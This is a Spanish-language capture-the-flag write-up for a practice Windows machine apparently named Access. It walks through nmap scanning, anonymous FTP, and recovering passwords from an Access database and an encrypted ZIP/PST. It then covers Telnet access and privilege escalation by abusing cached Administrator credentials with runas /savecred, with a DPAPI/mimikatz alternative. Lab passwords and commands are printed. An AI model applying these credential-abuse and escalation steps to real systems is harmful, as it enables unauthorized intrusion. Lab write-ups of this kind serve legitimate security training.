// 01

Resumen

Resumen. No hay SMB: la entrada es el FTP anónimo. De ahí salen una base de datos de Access (backup.mdb) con los usuarios de la aplicación y un ZIP cifrado (AES-256) con un PST de Outlook. La tabla auth_user da engineer:access4u@security, que abre el ZIP; dentro hay un correo que dice la nueva contraseña de la cuenta security (4Cc3ssC0ntr0ller). Con ella se entra por Telnet y se lee la user flag. En el escritorio público hay un acceso directo que usa runas /savecred para el Administrador: las credenciales están cacheadas (cmdkey /list), así que runas /savecred ejecuta comandos como Administrador y se lee la root flag.

// NOTA

Versión simplificada (la usada): dos detalles técnicos y el resto es leer ficheros. (1) El FTP responde al PASV con 0.0.0.0, así que hay que descargar en modo activo. (2) El Telnet de Windows exige responder a la negociación IAC (WILL/DO → DONT/WONT) antes de mostrar el login:.

Reconocimiento

SHELL
$ sudo nmap -sS -p- -n -Pn --min-rate 2500 --max-retries 1 --open 10.129.6.221
$ sudo nmap -Pn -sV -p21,23,80 10.129.6.221

Lo que se encontró: 21 ftp, 23 telnet, 80 http (Microsoft IIS 7.5). La web sólo sirve una imagen y no tiene rutas útiles.

El ZIP y el correo

// NOTA

The password for the "security" account has been changed to 4Cc3ssC0ntr0ller.

// 07

Telnet como security

SHELL
$ python3 telnet2.py 'whoami' 'cd C:\Users\security\Desktop' 'type user.txt' 'cmdkey /list'

Lo que se encontró: access\security, la user flag [flag oculta] y, en cmdkey /list:

Target: Domain:interactive=ACCESS\Administrator
Type: Domain Password
User: ACCESS\Administrator

*(El cliente tiene que responder al IAC; si no, el servidor no llega a mostrar login:.)*

// 08

Root con las credenciales cacheadas

SHELL
$ python3 telnet2.py 'runas /user:ACCESS\Administrator /savecred "cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\security\Desktop\r.txt"' 'type C:\Users\security\Desktop\r.txt'

Lo que se encontró: r.txt con la root flag [flag oculta].

Por qué funciona: runas /savecred usa la credencial guardada del Administrador (la misma que aparece en cmdkey /list y en el .lnk del escritorio público: runas.exe /user:ACCESS\Administrator /savecred). No hace falta conocer la contraseña.

Alternativa (DPAPI, también comprobada): volcar la masterkey y el blob de credenciales + mimikatz/pypykatz → contraseña 55Acc3ssS3cur1ty@megacorp → telnet como administrator y type root.txt.
